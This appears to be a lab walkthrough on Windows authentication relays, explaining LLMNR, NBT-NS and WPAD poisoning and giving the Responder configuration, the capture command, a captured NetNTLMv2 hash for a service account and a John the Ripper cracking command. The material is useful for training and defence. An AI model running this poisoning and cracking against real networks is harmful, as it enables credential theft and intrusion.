# Authentication relays

In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of 
the services provided by the network. These services use built-in authentication methods to verify the identity of 
incoming connections, such as NTLM Authentication used on a web application. This is a dive into NetNTLM 
authentication used by SMB.

Download the password list to be used for cracking the `NetNTLM` hash.

## Server Message Block

* Used by Windows (and Linux) systems to facilitate file sharing, remote administration, etc.
* Newer versions of the SMB protocol resolve some vulnerabilities, but companies with legacy systems continue to use older versions.
* SMB communications are not encrypted and can be intercepted.

## LLMNR, NBT-NS, and WPAD

* NBT-NS and LLMNR are ways to resolve hostnames to IP addresses on the LAN.
* WPAD is a way for Windows hosts to auto-discover web proxies.
* These protocols are broadcast on the LAN and can therefore be poisoned, tricking hosts into thinking they're talking with the intended target.
* Since these are layer 2 protocols, any time we use Responder to capture and poison requests, we must be on the same LAN as the target.

## Intercepting NetNTLM challenge

Edit the Responder configuration file and make sure the `SMB` and `HTTP` servers are set to `On`:

    sudo nano /etc/responder/Responder.conf

```text
[Responder Core]

; Servers to start
SQL = Off
SMB = On 
RDP = Off
Kerberos = On 
FTP = On 
POP = Off 
SMTP = Off
IMAP = Off
HTTP = On 
HTTPS = Off 
DNS = Off 
LDAP = On
DCERPC = Off
WINRM = Off
```

Run Responder and wait for the client to connect (A simulated host runs every 30 minutes):

    sudo responder -I tun0

Crack the hash:

    echo 'svcFileCopy::ZA:7cc90fae8c5d340d:4A9DCB457EC6B03CB8590632B3022206:010100000000000000CCDAED93A7D801F341996CD2C757EC00000000020008004E00360034004C0001001E00570049004E002D003500310032004B004C0041005A004400450039004F0004003400570049004E002D003500310032004B004C0041005A004400450039004F002E004E00360034004C002E004C004F00430041004C00030014004E00360034004C002E004C004F00430041004C00050014004E00360034004C002E004C004F00430041004C000700080000CCDAED93A7D80106000400020000000800300030000000000000000000000000200000A5ABACBF56562183324A9E5783EA22C522BE71493FF32CF3AAA81CA6A4F7CE880A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00350032002E00330034000000000000000000' > hash
    john --wordlist=./passwordlist.txt hash
